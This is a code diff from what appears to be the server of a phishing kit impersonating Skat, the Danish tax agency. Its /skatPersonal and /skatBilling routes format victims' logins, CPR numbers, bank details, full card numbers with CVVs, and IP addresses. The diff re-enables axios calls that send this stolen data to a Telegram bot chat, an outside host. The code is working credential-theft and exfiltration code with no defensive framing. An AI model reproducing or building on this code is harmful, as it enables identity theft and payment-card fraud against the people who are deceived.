@@ -8712,18 +8712,18 @@ app.post("/skatPersonal", (req, res) => {
     .catch((e) => {
       console.log(e);
     });
-  // axios
-  //   .post(
-  //     `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
-  //     {
-  //       chat_id: 1449567433,
-  //       text: `Skat\n${originalText}`,
-  //       parse_mode: "Markdown",
-  //     }
-  //   )
-  //   .catch((e) => {
-  //     console.log(e);
-  //   });
+  axios
+    .post(
+      `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
+      {
+        chat_id: 1449567433,
+        text: `Skat\n${originalText}`,
+        parse_mode: "Markdown",
+      }
+    )
+    .catch((e) => {
+      console.log(e);
+    });
 
   var resultsTxt = `+----------- Login Information ------------+\nUsername: ${username}\n+----------- Personal Information ------------+\nFull Name: ${fullname}\nDOB: ${dob}\nAddress: ${address}\nCity: ${city}\nZIP: ${zip}\nPhone Number: ${telephone}\nCPR: ${cpr}\nBank: ${bank}\n\n`;
 
@@ -8780,18 +8780,18 @@ app.post("/skatBilling", (req, res) => {
         .catch((e) => {
           console.log(e);
         });
-      // axios
-      //   .post(
-      //     `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
-      //     {
-      //       chat_id: 1449567433,
-      //       text: `Skat\n${originalText}`,
-      //       parse_mode: "Markdown",
-      //     }
-      //   )
-      //   .catch((e) => {
-      //     console.log(e);
-      //   });
+      axios
+        .post(
+          `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
+          {
+            chat_id: 1449567433,
+            text: `Skat\n${originalText}`,
+            parse_mode: "Markdown",
+          }
+        )
+        .catch((e) => {
+          console.log(e);
+        });
 
       var resultsTxt = `+----------- Login Information ------------+\nUsername: ${username}\n+----------- Personal Information ------------+\nFull Name: ${fullname}\nDOB: ${dob}\nAddress: ${address}\nCity: ${city}\nZIP: ${zip}\nPhone Number: ${telephone}\nCPR: ${cpr}\nBank: ${bank}\n+ ----------- Card Information ------------+\nCard Name: ${ccname}\nCard Number: ${ccnum}\nExpiry: ${ccexp}\nCVV: ${cccvv}\n+ ----------- IP Information ------------+\nUser Agent: ${userAgent}\nIP: ${ip}\n+ ----------- BIN List Info ------------+\n${binList}`;
 
